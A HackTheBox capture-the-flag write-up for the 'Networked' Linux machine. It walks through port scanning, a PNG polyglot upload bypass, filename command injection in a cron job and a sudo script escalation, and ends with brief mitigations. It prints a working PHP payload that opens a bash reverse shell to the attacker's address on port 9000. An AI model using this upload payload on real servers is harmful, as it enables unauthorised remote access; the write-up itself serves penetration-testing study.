
# 🚩 Networked - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/1-banner.png)

## 📝 General Information
| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | 🟢 Easy |
| **OS** | 🐧 Linux |
| **Mode** | 🧭 Guided Mode |
| **Date** | 2026-04-28 |

---

## 🎯 Executive Summary
*On Networked, The breach is began with a MIME-type bypass using a crafted Polyglot PNG to crack open the web layer for an initial foothold. The momentum shifted to a stealthy horizontal pivot, weaponizing a Command Injection via a filename to hijack a vulnerable Cronjob and seize control of the user guly. The final strike was a clinical exploitation of a root-level bash script, where a misconfigured network variable was the key to shattering the system's last defense and claiming the ROOT throne! 🚩*

---

## 🛠️ Tools Used
`Your mind and eyes!!`, `Nmap`, `dirb`, `hexcurse`, `nc`

---

## 🔍 1: Reconnaissance & Enumeration

Attacker = 10.10.14.34

Target = 10.129.26.10

### 1.1 Port Scanning
```bash
sudo nmap -sS -p- -A -T4 10.129.26.10
```
🧐 Findings:

```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Device type: general purpose|router|WAP|media device
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), MikroTik RouterOS 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 
```
> [!NOTE]
> 
> Which version of Apache is running on the target?
> 
> 2.4.6

1.2 Directory Brute-forcing
Bash
gobuster dir -u http://<Target_IP> -w /usr/share/wordlists/dirb/common.txt
[!IMPORTANT]

Discovered /uploads/ and /lib.php which gave a hint about the file upload logic.

🚀 Phase 2: Initial Access (Exploitation)
Vulnerability: [e.g., Insecure File Upload]
The source code revealed that it only checks for MIME Type and IP-based filenames.

Steps to Exploit:

Created a PNG polyglot file using printf.

Embedded a PHP reverse shell payload.

Named the file 10_10_14_34.php.png to bypass the regex check.

Bash
printf "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a" > 10_10_14_34.php.png
echo '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.34/9000 0>&1\""); ?>' >> 10_10_14_34.php.png
🛡️ Phase 3: Privilege Escalation
User: [Username]
Found a cronjob running a script named check_attack.php every 3 minutes.

Vulnerability: Command Injection via filename in exec() function.

Action: Created a file with a semicolon in its name to trigger the injection.

Root
Checked sudo permissions: sudo -l.

Binary: /usr/local/sbin/changename.sh

Exploit: Injected /bin/bash through the BOOTPROTO variable.

🏁 Conclusion & Mitigation
User Flag: ********************************

Root Flag: ********************************

Lessons Learned:
Always sanitize user input in system-level scripts.

Implement strict extension whitelisting for file uploads.

Created with 💜 by Reef
